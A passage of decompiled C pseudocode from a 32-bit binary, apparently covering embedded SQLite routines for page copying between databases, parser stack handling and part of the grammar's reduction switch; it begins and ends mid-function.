    if ( a3 >= 1020 - v9 )
      Sizea = 1020 - v9;
    if ( v9 )
      goto LABEL_10;
    v5 = (_DWORD *)sub_10058CA3(1024);
    if ( !v5 )
      return 3082;
    *v5 = 0;
    if ( v4 )
      *v4 = v5;
    else
      *(_DWORD *)(Size + 4) = v5;
    *(_DWORD *)(Size + 16) = v5;
LABEL_10:
    memcpy((void *)(*(_DWORD *)(Size + 16) + v9 + 4), a2, Sizea);
    a2 += Sizea;
    a3 -= Sizea;
    *(_QWORD *)(Size + 8) += Sizea;
    if ( a3 <= 0 )
      return 0;
  }
}

//----- (10081C0B) --------------------------------------------------------
int __cdecl sub_10081C0B(_DWORD *a1)
{
  _DWORD *v1; // edi
  int v2; // eax

  v1 = (_DWORD *)a1[1];
  while ( v1 )
  {
    v2 = (int)v1;
    v1 = (_DWORD *)*v1;
    sub_10058E74(v2);
  }
  sub_10081C60(a1);
  return 0;
}

//----- (10081C32) --------------------------------------------------------
int __cdecl sub_10081C32(_DWORD *a1)
{
  sub_10081C0B(a1);
  return 0;
}

//----- (10081C48) --------------------------------------------------------
int __cdecl sub_10081C48(int a1, _DWORD *a2)
{
  *a2 = *(_DWORD *)(a1 + 8);
  a2[1] = *(_DWORD *)(a1 + 12);
  return 0;
}

//----- (10081C60) --------------------------------------------------------
void *__usercall sub_10081C60@<eax>(_DWORD *a1@<esi>)
{
  void *result; // eax

  result = memset(a1, 0, 0x28u);
  *a1 = &unk_1017F074;
  return result;
}

//----- (10081C74) --------------------------------------------------------
int __cdecl sub_10081C74(int a1)
{
  int result; // eax

  result = 0;
  if ( a1 && a1 != 5 && a1 != 6 )
    return 1;
  return result;
}

//----- (10081C8D) --------------------------------------------------------
int __cdecl sub_10081C8D(int a1, unsigned int a2, int a3)
{
  int v3; // esi
  int v4; // eax
  signed int v5; // ebx
  signed int v6; // edi
  unsigned int v7; // ecx
  unsigned int v8; // edi
  unsigned int v9; // ecx
  int v10; // ebx
  int v11; // eax
  int v12; // esi
  int v13; // ebx
  signed __int64 v15; // [esp-10h] [ebp-60h]
  __int64 v16; // [esp-8h] [ebp-58h]
  int v17; // [esp+Ch] [ebp-44h]
  int v18; // [esp+10h] [ebp-40h] BYREF
  size_t Size; // [esp+14h] [ebp-3Ch]
  int v20; // [esp+18h] [ebp-38h]
  int v21; // [esp+1Ch] [ebp-34h]
  __int64 v22; // [esp+20h] [ebp-30h]
  unsigned int v23; // [esp+2Ch] [ebp-24h]
  __int64 v24; // [esp+30h] [ebp-20h]
  __int64 v25; // [esp+38h] [ebp-18h]
  __int64 v26; // [esp+40h] [ebp-10h]
  int v27; // [esp+4Ch] [ebp-4h]

  v3 = a1;
  v4 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4);
  v5 = *(unsigned __int16 *)(v4 + 20);
  v21 = *(_DWORD *)v4;
  v6 = *(unsigned __int16 *)(*(_DWORD *)(*(_DWORD *)(a1 + 24) + 4) + 20);
  v20 = v5;
  Size = v6;
  if ( v6 >= v5 )
    Size = v5;
  v22 = v6;
  v17 = 0;
  v24 = a2 * (__int64)v6;
  if ( v6 != v5 && *(_BYTE *)(**(_DWORD **)(*(_DWORD *)(a1 + 4) + 4) + 13) )
    v17 = 8;
  v7 = ((unsigned __int64)a2 * v6 - v22) >> 32;
  v8 = a2 * v6 - v22;
  v23 = v7;
  if ( !v17 )
  {
    while ( __SPAIR64__(v7, v8) < v24 )
    {
      v18 = 0;
      v16 = v5;
      v15 = __PAIR64__(v7, v8);
      v25 = v5;
      v26 = __SPAIR64__(v7, v8) % v5;
      v9 = __SPAIR64__(v7, v8) / v5 + 1;
      v10 = *(unsigned __int16 *)(*(_DWORD *)(*(_DWORD *)(v3 + 4) + 4) + 20);
      v27 = (unsigned __int64)(v15 / v16) >> 32;
      if ( v9 != 0x40000000 / v10 + 1 )
      {
        if ( v9 )
        {
          v11 = sub_1006EB74(v21, v9, &v18, 0);
          v12 = v18;
          v17 = v11;
          if ( !v11 )
          {
            v17 = sub_1006EFC8(v18);
            if ( !v17 )
            {
              memcpy((void *)(v26 + *(_DWORD *)v12), (const void *)(a3 + __SPAIR64__(v23, v8) % v22), Size);
              **(_BYTE **)(v12 + 4) = 0;
            }
          }
          if ( v12 )
          {
            v13 = *(_DWORD *)(v12 + 16);
            sub_100692F6(v12);
            sub_1006EB41(v13);
          }
          v3 = a1;
        }
        else
        {
          v17 = 11;
        }
      }
      v23 = (v25 + __PAIR64__(v23, v8)) >> 32;
      v8 += v25;
      if ( v17 )
        break;
      v7 = v23;
      v5 = v20;
    }
  }
  return v17;
}
// 1006EB41: using guessed type _DWORD __cdecl sub_1006EB41(_DWORD);

//----- (10081E28) --------------------------------------------------------
int __cdecl sub_10081E28(int *a1)
{
  int *v1; // ebx
  int v2; // edi
  int v3; // ecx
  int v4; // esi
  int v5; // eax
  int v6; // edx
  bool v7; // zf
  int v8; // eax
  unsigned int v9; // esi
  int *v10; // ebx
  unsigned int v11; // eax
  int v12; // edx
  bool v13; // cc
  int **v14; // eax
  int v15; // esi
  int v16; // eax
  _DWORD *v17; // ebx
  int v18; // ecx
  int v19; // ebx
  __int64 v20; // rax
  int v21; // esi
  int v22; // eax
  __int64 v23; // rax
  __int64 v24; // rax
  int v25; // esi
  __int64 v27; // [esp+Ch] [ebp-30h] BYREF
  __int64 v28; // [esp+14h] [ebp-28h]
  int v29; // [esp+20h] [ebp-1Ch]
  int v30; // [esp+24h] [ebp-18h]
  int *v31; // [esp+28h] [ebp-14h] BYREF
  int v32; // [esp+2Ch] [ebp-10h]
  int i; // [esp+30h] [ebp-Ch] BYREF
  __int64 v34; // [esp+34h] [ebp-8h] BYREF

  v1 = a1;
  sub_10061305(*(_DWORD *)(a1[5] + 68));
  sub_10068C39(a1[6]);
  if ( *a1 )
    sub_10061305(*(_DWORD *)(*a1 + 68));
  v2 = a1[7];
  if ( sub_10081C74(v2) )
    goto LABEL_64;
  v3 = a1[6];
  v4 = **(_DWORD **)(v3 + 4);
  v5 = a1[1];
  v6 = **(_DWORD **)(v5 + 4);
  HIDWORD(v34) = -1;
  v29 = v6;
  v7 = *a1 == 0;
  v32 = v4;
  v30 = 0;
  if ( v7 || *(_BYTE *)(*(_DWORD *)(v3 + 4) + 32) != 2 )
  {
    if ( !a1[3] )
    {
      v2 = sub_10062A0B(v5, 2);
      if ( v2 )
        goto LABEL_13;
      a1[3] = 1;
      sub_1006618B(a1[1], 1, a1 + 2);
    }
    v8 = a1[6];
    if ( *(_BYTE *)(v8 + 8) || (v2 = sub_10062A0B(v8, 0), v30 = 1, !v2) )
      v2 = sub_1006DFE2((_DWORD *)&v34 + 1, v4);
    goto LABEL_13;
  }
  v2 = 5;
LABEL_13:
  for ( i = 0; i != 0x7FFFFFFF; ++i )
  {
    v9 = v1[4];
    if ( v9 > HIDWORD(v34) )
      break;
    if ( v2 )
      goto LABEL_28;
    if ( v9 != 0x40000000 / *(unsigned __int16 *)(*(_DWORD *)(v1[6] + 4) + 20) + 1 )
    {
      if ( v9 )
      {
        v2 = sub_1006EB74(v32, v9, &v31, 0);
        if ( !v2 )
        {
          v10 = v31;
          v2 = sub_10081C8D((int)a1, v9, *v31);
          sub_1006EC75((int)v10);
        }
        v1 = a1;
      }
      else
      {
        v2 = 11;
      }
    }
    ++v1[4];
  }
  if ( !v2 )
  {
    v11 = v1[4];
    v12 = HIDWORD(v34) - v11 + 1;
    v13 = v11 <= HIDWORD(v34);
    v1[9] = HIDWORD(v34);
    v1[8] = v12;
    if ( !v13 )
      goto LABEL_29;
    if ( v1[10] )
      goto LABEL_61;
    v14 = (int **)(**(_DWORD **)(v1[6] + 4) + 172);
    v1[11] = (int)*v14;
    *v14 = v1;
    v1[10] = 1;
  }
LABEL_28:
  if ( v2 != 101 )
    goto LABEL_61;
LABEL_29:
  v2 = sub_100661BB(v1[1], 1, v1[2] + 1);
  if ( v2 )
    goto LABEL_60;
  v15 = *(unsigned __int16 *)(*(_DWORD *)(a1[6] + 4) + 20);
  v16 = *(unsigned __int16 *)(*(_DWORD *)(a1[1] + 4) + 20);
  v17 = (_DWORD *)*a1;
  v7 = *a1 == 0;
  v31 = (int *)v15;
  i = v16;
  if ( !v7 )
    sub_1006A029(0, v17);
  if ( v15 >= i )
  {
    v18 = HIDWORD(v34) * (v15 / i);
  }
  else
  {
    v18 = (i / v15 + HIDWORD(v34) - 1) / (i / v15);
    if ( v18 == 0x40000000 / *(unsigned __int16 *)(*(_DWORD *)(a1[1] + 4) + 20) + 1 )
      --v18;
  }
  v13 = v15 < i;
  v19 = v29;
  *(_DWORD *)(v29 + 24) = v18;
  if ( !v13 )
  {
    v2 = sub_1006F1F2(v19, 0, 0);
LABEL_57:
    if ( !v2 )
    {
      v2 = sub_100631FC(a1[1]);
      if ( !v2 )
        v2 = 101;
    }
    goto LABEL_60;
  }
  v28 = v15;
  v20 = SHIDWORD(v34) * (__int64)v15;
  v21 = *(_DWORD *)(v19 + 56);
  v34 = v20;
  v29 = v21;
  v2 = sub_1006F1F2(v19, 0, 1);
  if ( !v2 )
  {
    v22 = (*(int (__cdecl **)(int, __int64 *))(*(_DWORD *)v21 + 24))(v21, &v27);
    if ( !v22 && v27 > v34 )
      v22 = sub_10067433(v21, v34, SHIDWORD(v34));
    v2 = v22;
    if ( !v22 )
    {
      if ( !*(_BYTE *)(v19 + 8) )
        v22 = sub_10067447(*(_DWORD *)(v19 + 56), *(unsigned __int8 *)(v19 + 10));
      v2 = v22;
      if ( !v22 )
      {
        v23 = i + 0x40000000;
        if ( v23 >= v34 )
          LODWORD(v23) = v34;
        else
          HIDWORD(v34) = (i + 0x40000000) >> 31;
        LODWORD(v34) = v23;
        v24 = (int)(v31 + 0x10000000);
        HIDWORD(v27) = HIDWORD(v24);
        v25 = v24;
        do
        {
          if ( __SPAIR64__(HIDWORD(v24), v25) >= v34 )
            break;
          i = 0;
          if ( (unsigned int)(__SPAIR64__(HIDWORD(v24), v25) / v28) == -1 )
          {
            v2 = 11;
          }
          else
          {
            v2 = sub_1006EB74(v32, __SPAIR64__(HIDWORD(v24), v25) / v28 + 1, &i, 0);
            if ( !v2 )
              v2 = sub_10067419(v29, *(_DWORD *)i, (int)v31, v25, SHIDWORD(v27));
          }
          sub_1006EC75(i);
          HIDWORD(v24) = (v28 + __PAIR64__(HIDWORD(v27), v25)) >> 32;
          v25 += v28;
          HIDWORD(v27) = HIDWORD(v24);
        }
        while ( !v2 );
        goto LABEL_57;
      }
    }
  }
LABEL_60:
  v1 = a1;
LABEL_61:
  if ( v30 )
  {
    sub_1006313A(v1[6], 0);
    sub_100631FC(v1[6]);
  }
  v1[7] = v2;
LABEL_64:
  if ( *v1 )
    sub_10061317(*(_DWORD *)(*v1 + 68));
  sub_10068CA7(v1[6]);
  sub_10061317(*(_DWORD *)(v1[5] + 68));
  return v2;
}

//----- (100821E6) --------------------------------------------------------
int __usercall sub_100821E6@<eax>(int *a1@<esi>)
{
  int v2; // edi
  _DWORD *i; // eax
  int v4; // ebx

  if ( !a1 )
    return 0;
  sub_10061305(*(_DWORD *)(a1[5] + 68));
  sub_10068C39(a1[6]);
  v2 = *(_DWORD *)(a1[5] + 68);
  if ( *a1 )
  {
    sub_10061305(*(_DWORD *)(*a1 + 68));
    if ( *a1 )
      --*(_DWORD *)(a1[6] + 16);
  }
  if ( a1[10] )
  {
    for ( i = (_DWORD *)(**(_DWORD **)(a1[6] + 4) + 172); (int *)*i != a1; i = (_DWORD *)(*i + 44) )
      ;
    *i = a1[11];
  }
  sub_100632C4(a1[1]);
  v4 = a1[7] != 101 ? a1[7] : 0;
  sub_100592B1((_DWORD *)*a1, v4, 0);
  if ( *a1 )
    sub_10061317(*(_DWORD *)(*a1 + 68));
  sub_10068CA7(a1[6]);
  if ( *a1 )
    sub_10058E74((int)a1);
  sub_10061317(v2);
  return v4;
}

//----- (1008229D) --------------------------------------------------------
int __usercall sub_1008229D@<eax>(int result@<eax>, unsigned int a2@<edi>, int a3)
{
  _DWORD *i; // esi

  for ( i = (_DWORD *)result; i; i = (_DWORD *)i[11] )
  {
    result = sub_10081C74(i[7]);
    if ( !result && a2 < i[4] )
    {
      result = sub_10081C8D((int)i, a2, a3);
      if ( result )
        i[7] = result;
    }
  }
  return result;
}

//----- (100822D7) --------------------------------------------------------
int __usercall sub_100822D7@<eax>(int *a1@<ebx>, int a2)
{
  int v2; // esi
  int v4[13]; // [esp+8h] [ebp-34h] BYREF

  sub_10068C39(a2);
  sub_10068C39((int)a1);
  memset(v4, 0, 0x30u);
  v4[5] = *a1;
  v4[6] = (int)a1;
  v4[1] = a2;
  v4[4] = 1;
  sub_10081E28(v4);
  v2 = sub_100821E6(v4);
  if ( !v2 )
    *(_BYTE *)(*(_DWORD *)(a2 + 4) + 17) = 0;
  sub_10068CA7((int)a1);
  sub_10068CA7(a2);
  return v2;
}

//----- (10082349) --------------------------------------------------------
int __usercall sub_10082349@<eax>(int a1@<ebx>, int *a2@<esi>, _DWORD *a3, int a4)
{
  int result; // eax

  *a3 = sub_10075DC6((const void **)a1, 0, a2, a4, 0);
  a3[1] = *(_DWORD *)a1;
  result = *(_DWORD *)a1 + *(_DWORD *)(a1 + 4);
  a3[2] = result;
  return result;
}

//----- (10082374) --------------------------------------------------------
unsigned int __usercall sub_10082374@<eax>(_DWORD *a1@<ebx>, int *a2@<esi>, int a3, unsigned int *a4, unsigned int *a5)
{
  unsigned int result; // eax

  *a1 = sub_10075DC6(0, *a5, a2, a3, *a4);
  a1[1] = a4[1];
  result = a5[2];
  a1[2] = result;
  return result;
}

//----- (100823A5) --------------------------------------------------------
_DWORD *__usercall sub_100823A5@<eax>(_DWORD *a1@<ebx>, int *a2@<esi>, int a3, unsigned int *a4, _DWORD *a5)
{
  _DWORD *result; // eax

  *a1 = sub_10075DC6(0, 0, a2, a3, *a4);
  a1[1] = a4[1];
  result = a5;
  a1[2] = *a5 + a5[1];
  return result;
}

//----- (100823D5) --------------------------------------------------------
void __usercall sub_100823D5(int *a1@<eax>, _BYTE *a2@<ecx>, int a3@<esi>, char a4)
{
  int v4; // eax
  unsigned int v5; // [esp-4h] [ebp-4h]

  v4 = *a1;
  if ( !*(_BYTE *)(v4 + 30) && *a2 == 98 )
  {
    v5 = *(_DWORD *)(a3 + 12);
    *(_BYTE *)a3 = a4;
    sub_10075FD8(v4, v5);
    *(_DWORD *)(a3 + 12) = 0;
  }
}

//----- (100823FB) --------------------------------------------------------
unsigned int __usercall sub_100823FB@<eax>(_DWORD *a1@<ebx>, int *a2@<esi>, int a3, unsigned int *a4, _DWORD *a5)
{
  unsigned int result; // eax

  *a1 = sub_10075DC6(0, 0, a2, a3, *a4);
  a1[1] = *a5;
  result = a4[2];
  a1[2] = result;
  return result;
}

//----- (10082428) --------------------------------------------------------
void __usercall sub_10082428(int a1@<eax>, char a2@<dl>, unsigned int *a3@<ecx>)
{
  int *v3; // eax
  unsigned int *v4; // esi

  v3 = *(int **)(a1 + 8);
  switch ( a2 )
  {
    case -96:
    case -62:
      sub_1007B016(*v3, *a3);
      break;
    case -82:
    case -81:
    case -57:
    case -55:
    case -46:
    case -41:
    case -33:
    case -30:
    case -28:
    case -17:
    case -12:
      sub_10075FD8(*v3, *a3);
      break;
    case -77:
    case -69:
    case -59:
    case -56:
    case -54:
    case -52:
    case -42:
    case -40:
    case -39:
    case -36:
    case -35:
    case -29:
      sub_100767B1((int *)*a3, *v3);
      break;
    case -63:
    case -58:
    case -50:
    case -49:
      sub_1006C7F7((__int16 *)*a3, *v3);
      break;
    case -45:
    case -43:
    case -37:
      v4 = (unsigned int *)*a3;
      goto LABEL_10;
    case -21:
    case -16:
      sub_100727CB(*v3, *a3);
      break;
    case -19:
      v4 = (unsigned int *)a3[1];
LABEL_10:
      sub_1006C5DA(v4, *v3);
      break;
    default:
      return;
  }
}

//----- (1008250D) --------------------------------------------------------
int __usercall sub_1008250D@<eax>(int *a1@<esi>)
{
  unsigned __int8 v2; // bl

  if ( *a1 < 0 )
    return 0;
  v2 = BYTE2(a1[4 * *a1 + 3]);
  sub_10082428((int)a1, v2, (unsigned int *)&a1[4 * *a1 + 4]);
  --*a1;
  return v2;
}

//----- (10082536) --------------------------------------------------------
int __usercall sub_10082536@<eax>(_DWORD *a1@<eax>, unsigned __int8 a2@<cl>)
{
  int v3; // esi
  int v4; // eax
  int v5; // eax

  v3 = LOWORD(a1[4 * *a1 + 3]);
  while ( 1 )
  {
    if ( v3 > 418 )
      return (unsigned __int16)word_100FDDE0[v3];
    v4 = word_100FD820[v3];
    if ( v4 == -90 )
      return (unsigned __int16)word_100FDDE0[v3];
    v5 = a2 + v4;
    if ( (unsigned int)v5 <= 0x606 && byte_100FD218[v5] == a2 )
      return (unsigned __int16)word_100FC608[v5];
    if ( !a2 )
      return (unsigned __int16)word_100FDDE0[v3];
    if ( a2 >= 0x43u || !byte_100FE2D0[a2] )
      break;
    a2 = byte_100FE2D0[a2];
  }
  v5 = v5 - a2 + 67;
  if ( v5 < 0 || byte_100FD218[v5] != 67 )
    return (unsigned __int16)word_100FDDE0[v3];
  return (unsigned __int16)word_100FC608[v5];
}
// 100FC608: using guessed type __int16 word_100FC608[1544];
// 100FD820: using guessed type __int16 word_100FD820[420];
// 100FDDE0: using guessed type __int16 word_100FDDE0[632];

//----- (100825AD) --------------------------------------------------------
int __usercall sub_100825AD@<eax>(int *a1@<eax>, __int16 a2, char a3, _DWORD *a4)
{
  int v5; // eax
  int v6; // edi
  int v7; // eax
  int result; // eax

  v5 = ++*a1;
  if ( v5 < 100 )
  {
    result = (int)&a1[4 * v5 + 3];
    *(_WORD *)result = a2;
    *(_BYTE *)(result + 2) = a3;
    *(_DWORD *)(result + 4) = *a4;
    *(_DWORD *)(result + 8) = a4[1];
    *(_DWORD *)(result + 12) = a4[2];
  }
  else
  {
    v6 = a1[2];
    v7 = v5 - 1;
    *a1 = v7;
    while ( *a1 >= 0 )
      sub_1008250D(a1);
    result = sub_10059320((int *)v6, aParserStackOve);
    *(_BYTE *)(v6 + 20) = 1;
    a1[2] = v6;
  }
  return result;
}

//----- (10082606) --------------------------------------------------------
int __cdecl sub_10082606(int *a1, int a2)
{
  int v2; // ecx
  int v3; // ecx
  unsigned int *v4; // ebx
  int v5; // eax
  int v6; // eax
  _DWORD *v7; // eax
  int v8; // eax
  int v9; // edx
  int v10; // eax
  int v11; // edi
  int v12; // esi
  int v13; // eax
  _DWORD *v14; // edi
  int *v15; // eax
  const char *v16; // edx
  char *v17; // edx
  int v18; // ecx
  _DWORD *v19; // eax
  unsigned __int16 *v20; // eax
  _BYTE *v21; // eax
  int v22; // edx
  unsigned __int8 *v23; // ecx
  int v24; // eax
  int v25; // esi
  unsigned __int8 *v26; // ecx
  int *v27; // eax
  int *v28; // esi
  int v29; // ecx
  int v30; // eax
  int v31; // esi
  _BYTE *v32; // eax
  int v33; // ecx
  int *v34; // ebx
  int *v35; // eax
  int v36; // esi
  unsigned __int8 v37; // cl
  int result; // eax
  unsigned int *v39; // ebx
  unsigned __int16 v40; // dx
  int v41; // esi
  int v42; // ecx
  int v43; // eax
  int *v44; // esi
  int v45; // esi
  int *v46; // eax
  int v47; // ebx
  int v48; // esi
  _DWORD *v49; // ebx
  int *v50; // ecx
  int *v51; // eax
  _DWORD *v52; // eax
  char *v53; // eax
  int *v54; // eax
  int *v55; // eax
  int v56; // eax
  int v57; // eax
  _DWORD *v58; // eax
  _DWORD *v59; // eax
  _DWORD *v60; // eax
  _DWORD *v61; // eax
  _DWORD *v62; // eax
  int v63; // eax
  int v64; // esi
  int *v65; // edi
  _DWORD *v66; // eax
  _DWORD *v67; // eax
  const void **v68; // esi
  _DWORD *v69; // eax
  int v70; // eax
  int v71; // eax
  int *v72; // eax
  int v73; // edi
  int *v74; // eax
  unsigned int v75; // ebx
  int *v76; // ecx
  _DWORD *v77; // eax
  unsigned int *v78; // edi
  unsigned int *v79; // edi
  int *v80; // eax
  int *v81; // esi
  int *v82; // ebx
  _DWORD *v83; // eax
  int *v84; // esi
  _DWORD *v85; // eax
  bool v86; // zf
  int *v87; // esi
  _DWORD *v88; // eax
  _DWORD *v89; // eax
  int v90; // edi
  __int16 *v91; // eax
  int *v92; // esi
  _DWORD *v93; // eax
  int v94; // ecx
  int *v95; // esi
  _DWORD *v96; // eax
  _DWORD *v97; // esi
  unsigned int v98; // ebx
  _DWORD *v99; // esi
  _DWORD *v100; // eax
  int v101; // ecx
  int *v102; // esi
  int *v103; // edi
  int v104; // eax
  int v105; // esi
  int v106; // edi
  unsigned int v107; // esi
  _DWORD *v108; // eax
  _DWORD *v109; // eax
  int *v110; // eax
  int v111; // esi
  int v112; // eax
  int v113; // ecx
  int v114; // edi
  int v115; // [esp-1Ch] [ebp-D0h]
  __int16 *v116; // [esp-18h] [ebp-CCh]
  int *v117; // [esp-14h] [ebp-C8h]
  int *v118; // [esp-14h] [ebp-C8h]
  int v119; // [esp-10h] [ebp-C4h]
  int v120; // [esp-10h] [ebp-C4h]
  unsigned int v121; // [esp-Ch] [ebp-C0h]
  int v122; // [esp-Ch] [ebp-C0h]
  int v123; // [esp-8h] [ebp-BCh]
  unsigned int v124; // [esp-8h] [ebp-BCh]
  int *v125; // [esp-8h] [ebp-BCh]
  int v126; // [esp-4h] [ebp-B8h]
  _DWORD **v127; // [esp-4h] [ebp-B8h]
  unsigned int v128; // [esp-4h] [ebp-B8h]
  int v129; // [esp+0h] [ebp-B4h]
  int v130; // [esp+0h] [ebp-B4h]
  int *v131; // [esp+0h] [ebp-B4h]
  int v132; // [esp+0h] [ebp-B4h]
  int v133; // [esp+0h] [ebp-B4h]
  int v134[16]; // [esp+14h] [ebp-A0h] BYREF
  int v135[9]; // [esp+54h] [ebp-60h] BYREF
  int v136; // [esp+78h] [ebp-3Ch]
  char *v137; // [esp+7Ch] [ebp-38h]
  int v138; // [esp+80h] [ebp-34h]
  int *v139; // [esp+84h] [ebp-30h]
  __int16 *v140; // [esp+88h] [ebp-2Ch]
  unsigned __int8 v141[4]; // [esp+8Ch] [ebp-28h] BYREF
  _DWORD *v142; // [esp+90h] [ebp-24h] BYREF
  int v143; // [esp+94h] [ebp-20h] BYREF
  int *v144; // [esp+98h] [ebp-1Ch]
  int v145; // [esp+9Ch] [ebp-18h]
  unsigned int *v146; // [esp+A0h] [ebp-14h]
  int v147[3]; // [esp+A4h] [ebp-10h] BYREF
  int v148; // [esp+B0h] [ebp-4h]
  int v149; // [esp+C0h] [ebp+Ch]

  v148 = a1[2];
  v2 = *a1;
  memset(v147, 0, sizeof(v147));
  v3 = 4 * v2;
  v4 = (unsigned int *)&a1[v3 + 3];
  v146 = v4;
  switch ( a2 )
  {
    case 5:
      v5 = v148;
      *(_BYTE *)(v148 + 476) = 0;
      goto LABEL_5;
    case 6:
      v5 = v148;
      *(_BYTE *)(v148 + 476) = 1;
      goto LABEL_5;
    case 7:
      v5 = v148;
      *(_BYTE *)(v148 + 476) = 2;
LABEL_5:
      *(_DWORD *)(v5 + 444) = 0;
      goto LABEL_57;
    case 8:
      sub_10069BE9((int *)v148);
      goto LABEL_57;
    case 9:
      sub_1006C9A6((int *)v148, a1[v3]);
      goto LABEL_57;
    case 13:
    case 78:
      v147[0] = 7;
      goto LABEL_57;
    case 14:
    case 15:
    case 16:
    case 115:
    case 117:
      v6 = BYTE2(a1[v3 + 3]);
      goto LABEL_293;
    case 17:
    case 18:
      v7 = sub_1007C271((int *)v148);
      if ( !v7 )
        goto LABEL_57;
      v126 = 0;
      goto LABEL_13;
    case 19:
      v7 = sub_1007C271((int *)v148);
      if ( !v7 )
        goto LABEL_57;
      v126 = 1;
LABEL_13:
      sub_1005AB66((int)v7, 33, 1, v126, 0);
      goto LABEL_57;
    case 22:
      sub_1006CA0C((int)&a1[v3 + 4], (int *)v148, 0);
      goto LABEL_57;
    case 23:
      sub_1006CA0C((int)&a1[v3 + 4], (int *)v148, 1);
      goto LABEL_57;
    case 24:
      sub_1006CA0C((int)&a1[v3 + 4], (int *)v148, 2);
      goto LABEL_57;
    case 26:
      sub_1006A41E((int)&a1[v3 + 4], v148, (int)&a1[v3], a1[v3 - 12], 0, 0, a1[v3 - 4]);
      goto LABEL_57;
    case 27:
      *(_BYTE *)(*(_DWORD *)v148 + 226) = 0;
      goto LABEL_20;
    case 28:
    case 31:
    case 70:
    case 72:
    case 82:
    case 83:
    case 85:
    case 87:
    case 98:
    case 109:
    case 120:
    case 121:
    case 123:
    case 133:
    case 145:
    case 150:
    case 151:
    case 156:
    case 158:
    case 159:
    case 161:
    case 168:
    case 180:
    case 223:
    case 226:
    case 237:
    case 239:
    case 241:
    case 246:
    case 247:
    case 282:
    case 304:
      goto LABEL_81;
    case 29:
    case 30:
    case 71:
    case 86:
    case 108:
    case 119:
    case 140:
    case 157:
    case 224:
    case 227:
    case 298:
      v147[0] = 1;
      goto LABEL_57;
    case 32:
      v144 = &a1[v3];
      v9 = *(_DWORD *)v148;
      v145 = *(_DWORD *)v148;
      if ( &a1[v3] != (int *)-16 && !*(_BYTE *)(v9 + 30) )
      {
        v146 = *(unsigned int **)(v148 + 500);
        if ( v146 )
        {
          v10 = sub_1005855F(v9, v146[17]);
          v86 = v146[11] == 0;
          v138 = v10;
          if ( v86 )
            goto LABEL_326;
          memset(v135, 0, sizeof(v135));
          memset(v134, 0, sizeof(v134));
          v134[8] = -1;
          v11 = v146[11];
          v134[3] = v146[1];
          v135[0] = v148;
          LOWORD(v134[0]) = 1;
          v134[5] = (int)v146;
          v135[1] = (int)v134;
          BYTE2(v135[5]) = 1;
          if ( !sub_1008003C(v11, (int)v135) )
          {
LABEL_326:
            v12 = v145;
            v13 = (int)v146;
            if ( *(_BYTE *)(v145 + 124) )
            {
              v146[6] = *(_DWORD *)(v145 + 120);
              if ( *(_BYTE *)(v12 + 124) )
                goto LABEL_38;
            }
            v14 = (_DWORD *)v148;
            v15 = sub_1007C271((int *)v148);
            v139 = v15;
            if ( v15 )
            {
              sub_1005ABD1((int)v15, 42, 0);
              if ( v146[7] )
              {
                v137 = aView;
                v16 = aView_0;
              }
              else
              {
                v137 = aTable;
                v16 = aTable_0;
              }
              v140 = (__int16 *)sub_10055484(v12, "CREATE %s %.*s", v16, v4[1] - v14[120] + 1, (const char *)v14[120]);
              v17 = aSqliteTempMast_2;
              if ( v138 != 1 )
                v17 = aSqliteMaster_2;
              v129 = v14[102];
              v123 = v14[103];
              v121 = v146[1];
              v115 = *(_DWORD *)(16 * v138 + *(_DWORD *)(v12 + 8));
              v136 = 16 * v138;
              sub_10069DB8((int)v14, aUpdateQSSetTyp, v115, v17, v137, v121, v121, v123, v140, v129);
              sub_10058EC7(v12, (unsigned int)v140);
              sub_1006AB7A(v14, v138);
              if ( (*((_BYTE *)v146 + 34) & 8) != 0 )
              {
                v19 = (_DWORD *)(v136 + *(_DWORD *)(v145 + 8));
                v18 = v19[3];
                if ( !*(_DWORD *)(v18 + 68) )
                {
                  sub_10069DB8((int)v14, aCreateTableQSq, *v19);
                  v18 = v130;
                }
              }
              v12 = v145;
              v20 = (unsigned __int16 *)sub_10055484(v145, aTblNameQ, v146[1], v18);
              sub_1005AC02(v139, 98, v138, 0, 0, v20, (_BYTE *)0xFFFFFFFF);
              v13 = (int)v146;
              if ( *(_BYTE *)(v12 + 124) )
              {
LABEL_38:
                v131 = (int *)v13;
                v21 = sub_10059297(*(_BYTE **)(v13 + 4));
                if ( sub_10069032((unsigned int *)(v22 + 4), v23, (int)v21, v131) )
                {
                  *(_BYTE *)(v12 + 30) = 1;
                }
                else
                {
                  v24 = v148;
                  *(_DWORD *)(v148 + 500) = 0;
                  ++*(_DWORD *)(v12 + 40);
                  *(_DWORD *)(v12 + 12) |= 0x200u;
                  v25 = (int)v146;
                  if ( !v146[7] )
                  {
                    v26 = *(unsigned __int8 **)(v24 + 480);
                    v27 = v144;
                    if ( !*v144 )
                      v27 = (int *)(v4 + 1);
                    *(_DWORD *)(v25 + 48) = sub_10070AAB(v26, *v27 - (_DWORD)v26) + 13;
                  }
                }
              }
            }
          }
        }
      }
      goto LABEL_57;
    case 33:
      sub_1006ADD2(v148, 0, 0, (_DWORD **)a1[v3 + 4]);
      sub_1007B016(*(_DWORD *)v148, v4[1]);
      goto LABEL_57;
    case 36:
      v147[0] = a1[v3 - 4];
      v147[1] = *(_DWORD *)(v148 + 488) + *(_DWORD *)(v148 + 492) - a1[v3 - 4];
      goto LABEL_57;
    case 37:
      v28 = &a1[v3 + 4];
      sub_1006A6E3((int *)v148, (int)v28);
      v147[0] = *v28;
      v8 = v4[2];
      goto LABEL_276;
    case 38:
    case 39:
    case 40:
    case 41:
    case 42:
    case 43:
    case 46:
    case 49:
    case 127:
    case 128:
    case 138:
    case 147:
    case 252:
    case 261:
    case 262:
    case 263:
    case 264:
    case 265:
    case 266:
    case 267:
    case 268:
    case 286:
LABEL_20:
      v147[0] = a1[v3 + 4];
      v8 = a1[v3 + 5];
      goto LABEL_276;
    case 45:
      v29 = *(_DWORD *)(v148 + 500);
      if ( v29 )
      {
        v30 = *(_DWORD *)(v29 + 12);
        if ( v30 >= 1 )
        {
          v31 = *(_DWORD *)(v29 + 16) + 24 * v30 - 24;
          v32 = (_BYTE *)sub_1006A297((int)(v4 + 1), *(_DWORD *)v148);
          *(_DWORD *)(v31 + 12) = v32;
          *(_BYTE *)(v31 + 22) = sub_1006A7EB(v33, v32);
        }
      }
      goto LABEL_57;
    case 47:
      v147[0] = a1[v3 - 8];
      v8 = a1[v3 + 4] + a1[v3 + 5] - a1[v3 - 8];
      goto LABEL_276;
    case 48:
      v147[0] = a1[v3 - 16];
      v8 = a1[v3 + 4] + a1[v3 + 5] - a1[v3 - 16];
      goto LABEL_276;
    case 50:
